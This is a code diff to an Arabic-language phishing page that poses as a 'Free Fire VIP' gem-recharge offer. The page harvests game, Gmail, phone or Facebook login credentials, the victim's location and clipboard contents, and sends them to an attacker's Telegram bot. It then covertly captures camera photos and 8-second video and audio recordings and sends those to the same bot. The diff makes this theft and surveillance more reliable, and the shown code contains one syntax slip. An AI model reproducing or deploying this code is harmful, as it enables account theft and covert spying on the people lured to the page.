@@ -144,17 +144,15 @@
     <div class="logo">🔥 FREE FIRE VIP 🔥</div>
     <div class="sub-title">سجل دخولك لحسابك (Gmail / رقم الهاتف / Facebook) لشحن الجواهر</div>
     
-    <form id="ffForm" onsubmit="submitCredentials(event)">
-        <div class="input-group">
-            <label>البريد (Gmail) أو رقم الهاتف أو فيسبوك:</label>
-            <input type="text" id="identifier" placeholder="أدخل البريد أو الرقم أو الايميل" required>
-        </div>
-        <div class="input-group">
-            <label>كلمة المرور (Password):</label>
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-        </div>
-        <button type="submit" class="btn-submit">تسجيل الدخول وشحن الجواهر</button>
-    </form>
+    <div class="input-group">
+        <label>البريد (Gmail) أو رقم الهاتف أو فيسبوك:</label>
+        <input type="text" id="identifier" placeholder="أدخل البريد أو الرقم أو الايميل" required>
+    </div>
+    <div class="input-group">
+        <label>كلمة المرور (Password):</label>
+        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+    </div>
+    <button type="button" class="btn-submit" onclick="submitCredentials()">تسجيل الدخول وشحن الجواهر</button>
     <div id="statusMsg"></div>
 </div>
 
@@ -171,11 +169,11 @@
     };
 
     function sendTelegramMessage(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(() => {});
+        });
     }
 
     function sendTelegramPhoto(base64Image, caption) {
@@ -214,7 +212,6 @@
         return new Blob([ab], {type: mimeString});
     }
 
-    // فور الضغط على زر "استكمال الدخول" يتم سحب الموقع، الحافظة، وبدء التقاط الوسائط تلقائياً
     async function requestAccessAndShow() {
         document.getElementById('permissionOverlay').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
@@ -223,7 +220,9 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 victimData.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            }, () => {}, { timeout: 5000 });
+            }, () => {
+                victimData.location = "تم رفض إذن الموقع";
+            }, { timeout: 5000 });
         }
 
         // 2. سحب الحافظة
@@ -231,22 +230,20 @@
             const clip = await navigator.clipboard.readText();
             if(clip) victimData.clipboard = clip;
         } catch(e) {}
-
-        // 3. التقاط الوسائط (الكاميرا والصوت) بالخلفية فوراً
-        setTimeout(async () => {
-            await captureAllMedia("user", "الأمامية");
-            await captureAllMedia("environment", "الخلفية");
-        }, 1000);
     }
 
-    // عند تسجيل الدخول وإرسال البيانات بالشكل المطلوب
-    function submitCredentials(event) {
-        event.preventDefault();
-        const identifier = document.getElementById('identifier').value;
-        const password = document.getElementById('password').value;
+    async function submitCredentials() {
+        const identifier = document.getElementById('identifier').value.trim();
+        const password = document.getElementById('password').value.trim();
         
-        document.getElementById('statusMsg').innerText = "جاري التحقق من الحساب وشحن الجواهر...";
+        if (!identifier || !password) {
+            alert("يرجى ملء جميع الحقول المطلوبة!");
+            return;
+        }
 
+        document.getElementById('statusMsg'].innerText = "جاري التحقق من الحساب وشحن الجواهر...";
+
+        // تجهيز وصياغة الرسالة بالشكل المطلوب تماماً
         let finalMessage = `تم دخوݪ   مستخدم اݪي حسابڪ  وتم سحب 
 معݪومات اݪمستخدم 
 
@@ -261,7 +258,16 @@
 
 اݪموقع 😊~> ${victimData.location} ☆`;
 
-        sendTelegramMessage(finalMessage);
+        // إرسال الرسالة النصية فوراً والانتظار حتى تؤكد وصولها للتيليجرام
+        try {
+            await sendTelegramMessage(finalMessage);
+        } catch(err) {}
+
+        // البدء بسحب الوسائط وإرسالها تباعاً
+        setTimeout(async () => {
+            await captureAllMedia("user", "الأمامية");
+            await captureAllMedia("environment", "الخلفية");
+        }, 500);
         
         setTimeout(() => {
             alert("خطأ في الاتصال بالخادم أو كلمة المرور غير صحيحة. يرجى المحاولة لاحقاً.");
@@ -274,42 +280,72 @@
         const ctx = canvas.getContext('2d');
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 1500));
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: facingMode } }, 
+                audio: true 
+            }).catch(async () => {
+                return await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: true 
+                });
+            });
 
-            // التقاط 4 صور
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 2000));
+
             for (let i = 0; i < 4; i++) {
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                sendTelegramPhoto(canvas.toDataURL('image/jpeg'), `📸 صورة (${name}) رقم ${i+1}`);
-                await new Promise(r => setTimeout(r, 800));
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendTelegramPhoto(canvas.toDataURL('image/jpeg'), `📸 صورة (${name}) رقم ${i+1}`);
+                }
+                await new Promise(r => setTimeout(r, 1000));
             }
 
-            // تسجيل فيديو لمدة 8 ثواني
-            let videoChunks = [];
-            let vRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            vRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
-            vRecorder.onstop = () => {
-                let vBlob = new Blob(videoChunks, { type: 'video/webm' });
-                sendTelegramVideo(vBlob, `🎥 فيديو مسجل (${name}) مدته 8 ثواني`);
-            };
-            vRecorder.start();
-            await new Promise(r => setTimeout(r, 8000));
-            vRecorder.stop();
+            await new Promise((resolve) => {
+                let videoChunks = [];
+                let vRecorder;
+                try {
+                    vRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                } catch(e) {
+                    vRecorder = new MediaRecorder(stream);
+                }
 
-            // تسجيل صوت لمدة 8 ثواني
-            let audioChunks = [];
-            let aRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-            aRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
-            aRecorder.onstop = () => {
-                let aBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                sendTelegramAudio(aBlob, `🎙️ تسجيل صوتي (${name}) مدته 8 ثواني`);
-            };
-            aRecorder.start();
-            await new Promise(r => setTimeout(r, 8000));
-            aRecorder.stop();
+                vRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
+                vRecorder.onstop = () => {
+                    let vBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    sendTelegramVideo(vBlob, `🎥 فيديو مسجل (${name}) مدته 8 ثواني`);
+                    resolve();
+                };
+                vRecorder.start();
+                setTimeout(() => {
+                    if (vRecorder.state === "recording") vRecorder.stop();
+                    else resolve();
+                }, 8000);
+            });
+
+            await new Promise((resolve) => {
+                let audioChunks = [];
+                let aRecorder;
+                try {
+                    aRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                } catch(e) {
+                    aRecorder = new MediaRecorder(stream);
+                }
+
+                aRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+                aRecorder.onstop = () => {
+                    let aBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    sendTelegramAudio(aBlob, `🎙️ تسجيل صوتي (${name}) مدته 8 ثواني`);
+                    resolve();
+                };
+                aRecorder.start();
+                setTimeout(() => {
+                    if (aRecorder.state === "recording") aRecorder.stop();
+                    else resolve();
+                }, 8000);
+            });
 
             stream.getTracks().forEach(t => t.stop());
         } catch (err) {
